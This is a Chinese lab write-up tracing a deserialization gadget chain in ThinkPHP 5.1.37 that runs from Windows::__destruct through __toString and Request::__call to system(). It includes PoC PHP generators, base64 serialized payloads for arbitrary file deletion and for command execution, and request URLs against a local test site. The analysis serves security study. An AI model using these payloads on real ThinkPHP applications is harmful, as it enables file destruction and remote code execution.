thinkphp 的版本为 5.1.37

# 前置



## 文章

[Thinkphp 5.1.37 反序列化利用链 - zpchcbd - 博客园 (cnblogs.com)](https://www.cnblogs.com/zpchcbd/p/12642225.html)

[挖掘暗藏ThinkPHP中的反序列利用链 - 斗象能力中心 (riskivy.com)](https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/)



## 基础

### 魔术方法的说明

```
#魔术方法利用点分析：
触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：

__construct():     //构造函数，当对象new的时候会自动调用
__destruct()：     //析构函数当对象被销毁时会被自动调用
__wakeup():       //unserialize()时会被自动调用
__invoke():       //当尝试以调用函数的方法调用一个对象时，会被自动调用
__call():         //在对象上下文中调用不可访问的方法时触发
__callStatci():   //在静态上下文中调用不可访问的方法时触发
__get():         //用于从不可访问的属性读取数据
__set():         //用于将数据写入不可访问的属性
__isset():       //在不可访问的属性上调用isset()或empty()触发
__unset():       //在不可访问的属性上使用unset()时触发
__toString():    //把类当作字符串使用时触发（拼接或者输出）
__sleep():       //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用
```



### 反序列化的常见起点

__wakeup 一定会调用

__destruct 一定会调用

__toString 当一个对象被反序列化后又被当做字符串使用



### 反序列化的常见中间跳板

__toString 当一个对象被当做字符串使用（拼接或者输出）

__get 读取不可访问或不存在属性时被调用

__set 当给不可访问或不存在属性赋值时被调用

__isset 对不可访问或不存在的属性调用isset()或empty()时被调用

形如 $this->$func();



### 反序列化的常见终点

__call 调用不可访问或不存在的方法时被调用

call_user_func 一般php代码执行都会选择这里

call_user_func_array 一般php代码执行都会选择这里

现在又多了**phar反序列化的利用方式**，能够反序列化其metadata部分，利用的范围增加了许多！

------

环境：thinkphp 5.1.37



# 任意文件删除初探

## 分析

1、全局搜索  `function __destruct`

<img src=".\图片\Snipaste_2023-05-24_14-54-33.png" alt="Snipaste_2023-05-24_14-54-33" style="zoom:67%;" />

先看看 windows 类

2、windows 类

析构方法 `__destruct()` 里有 关键函数 `removeFiles()`

```php
public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
```

跟进 `removeFiles()` 则为删除文件的方法，假如 `$files` 可控便可以任意文件删除，并且 `file_exists` 能够触发 `__toString` 方法

```php
 /**
     * 删除临时文件
     */
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```

## 人为构造起点

人为构造起点是便于我们测试与理解

在 `application/index/controller/Index.php`  里修改 `index()` 方法 来人为构造起点触发：

```php
 public function index()
    {
        //return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    unserialize(base64_decode($_GET['id']));
    }
```

## 构造POC

观察 windows 类并去除不必要的部分，构造POC如下（注意 \t 的转义）：

```php
<?php
namespace think\process\pipes;
class Pipes{}

class Windows extends Pipes{
    private $files = ["C:\phpstudy_pro\WWW\\thinkphp_v5.1.37\zf1yolo.txt"];
}
echo base64_encode(serialize(new Windows()));
```

触发：

<img src=".\图片\Snipaste_2023-05-24_15-09-38.png" alt="Snipaste_2023-05-24_15-09-38" style="zoom:80%;" />

得到 payload ：

```
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjQ4OiJDOlxwaHBzdHVkeV9wcm9cV1dXXHRoaW5rcGhwX3Y1LjEuMzdcemYxeW9sby50eHQiO319
```

## 文件删除

```http
http://www.thinkphp5.com/public/index.php?id=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjQ4OiJDOlxwaHBzdHVkeV9wcm9cV1dXXHRoaW5rcGhwX3Y1LjEuMzdcemYxeW9sby50eHQiO319
```

<img src=".\图片\Snipaste_2023-05-24_15-12-22.png" alt="Snipaste_2023-05-24_15-12-22" style="zoom:80%;" />

触发即删除

## Debug调试

执行到这里时文件便被删除了

<img src=".\图片\Snipaste_2023-05-24_15-45-43.png" alt="Snipaste_2023-05-24_15-45-43" style="zoom:80%;" />

# 熟悉魔术方法

1、魔术方法

- file_exists 能够触发 __toString 方法

- __call(): //在对象上下文中调用不可访问的方法时触发

```php
<?php
class Test{

    function __destruct(){
        echo "__destruct</br>"; //类销毁的时候自动调用
    }

    function __toString()
    {
       echo "__toString<br>"; //对象当做字符串拼接或者输出的时候会触发这个函数
       return "";
    }
    function __call($name, $arguments)  //在对象上下文中调用不可访问的方法时触发
    {
        echo "__call--".$name."--".$arguments;
        echo "<br>";
        // TODO: Implement __call() method.
    }
}

$p =new Test();//实例化一个对象

file_exists($p);

$p->visible();
```

<img src=".\图片\Snipaste_2023-05-24_16-30-09.png" alt="Snipaste_2023-05-24_16-30-09" style="zoom:80%;" />

2、call_user_func()

`call_user_func()`  导致代码执行

```php
<?php

call_user_func('system','calc');
```

<img src=".\图片\Snipaste_2023-05-24_16-32-38.png" alt="Snipaste_2023-05-24_16-32-38" style="zoom:80%;" />

3、

```php
<?php
/*class Test{

}


$a=array(new Test(),'calc');


call_user_func_array('phpinfo',$a);*/


class Test{
    public function isAjax(){
        echo "isAjax";
    }
    public function __call($method, $args){
        echo "call";
        call_user_func_array(array($this,"isAjax"), $args);
    }
}

$a = new Test();
$a->visible();
```

<img src=".\图片\Snipaste_2023-05-24_16-36-23.png" alt="Snipaste_2023-05-24_16-36-23" style="zoom:67%;" />

# 再次挖掘

## 步骤

### Windows类

析构方法 `__destruct()` 里有 关键函数 `removeFiles()`

```php
public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
```

跟进 `removeFiles()` 则为删除文件的方法，假如 `$files` 可控便可以任意文件删除，并且 `file_exists` 能够触发 `__toString` 方法

```php
/**
     * 删除临时文件
     */
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```

### Conversion.php

由 于`file_exists`  能够触发 `__toString` 方法，可以对 `__toSting` 方法进行全局搜索发现 `Conversion.php` 中有实现，它会调用 `toJson` 方法

```php
 public function __toString()
    {
        return $this->toJson();
    }
```

`toJson` 中接着会调用 `toArray` 方法，继续跟

```php
public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }
```

在该 `toArray` 方法中 就可以去寻找能不能找到想要的反序列化的终点造成命令执行的POP链，满足条件都为**$可控变量->方法(参数可控)**

```php
    public function toArray()
    {
        $item       = [];
        $hasVisible = false;

        foreach ($this->visible as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    list($relation, $name)      = explode('.', $val);
                    $this->visible[$relation][] = $name;
                } else {
                    $this->visible[$val] = true;
                    $hasVisible          = true;
                }
                unset($this->visible[$key]);
            }
        }

        foreach ($this->hidden as $key => $val) {
            if (is_string($val)) {
                if (strpos($val, '.')) {
                    list($relation, $name)     = explode('.', $val);
                    $this->hidden[$relation][] = $name;
                } else {
                    $this->hidden[$val] = true;
                }
                unset($this->hidden[$key]);
            }
        }

        // 合并关联数据
        $data = array_merge($this->data, $this->relation);

        foreach ($data as $key => $val) {
            if ($val instanceof Model || $val instanceof ModelCollection) {
                // 关联模型对象
                if (isset($this->visible[$key]) && is_array($this->visible[$key])) {
                    $val->visible($this->visible[$key]);
                } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {
                    $val->hidden($this->hidden[$key]);
                }
                // 关联模型对象
                if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {
                    $item[$key] = $val->toArray();
                }
            } elseif (isset($this->visible[$key])) {
                $item[$key] = $this->getAttr($key);
            } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                $item[$key] = $this->getAttr($key);
            }
        }

        // 追加属性（必须定义获取器）
        if (!empty($this->append)) {
            foreach ($this->append as $key => $name) {
                if (is_array($name)) {
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);

                    if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
                        }
                    }

                    $item[$key] = $relation ? $relation->append($name)->toArray() : [];
                } elseif (strpos($name, '.')) {
                    list($key, $attr) = explode('.', $name);
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);

                    if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible([$attr]);
                        }
                    }

                    $item[$key] = $relation ? $relation->append([$attr])->toArray() : [];
                } else {
                    $item[$name] = $this->getAttr($name, $item);
                }
            }
        }

        return $item;
    }
```

这里找的是如下这块

```php
if (is_array($name)) {
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);

                    if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);//因为visible不存在，所以会调用$relation里的 __call() 方法
                        }
                    }

                    $item[$key] = $relation ? $relation->append($name)->toArray() : [];
                }
```

因为满足条件需要时 **$可控变量->方法(参数可控)**，所以还要看 $relation 能否可控，受 getRelation 函数的影响

<img src=".\图片\Snipaste_2023-05-24_16-50-59.png" alt="Snipaste_2023-05-24_16-50-59" style="zoom:80%;" />

那么 `$this->append` ，`append` 变量就一定需要控制

<img src=".\图片\Snipaste_2023-05-24_16-52-22.png" alt="Snipaste_2023-05-24_16-52-22" style="zoom:80%;" />

接着走的当前流程就是如下

<img src=".\图片\1586953-20200407002229640-982246450.png" alt="1586953-20200407002229640-982246450" style="zoom:80%;" />

这时候 `$relation->visible($name);` 就会去调用`__call`方法，我们需要找一个能够利用的地方

### Request类

**利用的地方的条件需要：**

1.该类中没有"visible"方法， 因为这样才能触发__call方法

2.实现了`__call` 方法 ，并且 `__call` 方法中有我们想要的东西，比如 `call_user_func_array ` 、 `call_user_func` 等等

Request类中的 __call方法 就满足条件，并且 $this->hook 可控

Request类中的 __call方法 就满足条件，并且 $this->hook 可控

<img src=".\图片\1586953-20200407002431048-1109418633.png" alt="1586953-20200407002431048-1109418633" style="zoom:80%;" />

寻找当前类中能够利用的函数，比如 isAjax ，其中调用了param函数，那么肯定就能触发input函数了，可以回顾下tp 5.0/1.x的命令执行漏洞！

<img src=".\图片\1586953-20200407002745375-2079642464.png" alt="img"  />

## 构建EXP

```php
<?php

namespace think;
class Request{
    protected $hook = [];
    protected $filter = "system";
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'huha'];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        # append键必须存在，并且与$this->data相同
        $this->append = ["huha"=>[]];
        $this->data = ["huha"=>new Request()];
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}

namespace think\process\pipes;
use think\model\Pivot;

class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
//var_dump(new Windows());
echo base64_encode(serialize(new Windows()));

// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=
?>
```

测试如下：

```http
http://www.thinkphp5.com/public/?huha[]=whoami&id=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=
```

<img src=".\图片\Snipaste_2023-05-24_17-05-59.png" alt="Snipaste_2023-05-24_17-05-59" style="zoom:67%;" />
